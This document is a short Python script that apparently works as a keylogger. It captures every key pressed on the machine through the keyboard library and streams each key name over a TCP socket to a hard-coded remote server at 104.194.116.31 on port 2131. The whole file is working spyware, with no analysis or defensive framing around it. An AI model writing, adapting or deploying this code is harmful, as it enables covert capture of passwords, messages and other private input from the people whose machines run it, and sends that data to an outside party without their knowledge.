import socket
import keyboard

# Replace with the server's IP address and port
SERVER_IP = '104.194.116.31'
SERVER_PORT = 2131


def main():
    # Create a socket to connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, SERVER_PORT))

    try:
        while True:
            key_event = keyboard.read_event()
            if key_event.event_type == keyboard.KEY_DOWN:
                # Send the key to the server
                key = key_event.name
                client_socket.send(key.encode())
    except KeyboardInterrupt:
        pass

    client_socket.close()

if __name__ == "__main__":
    main()
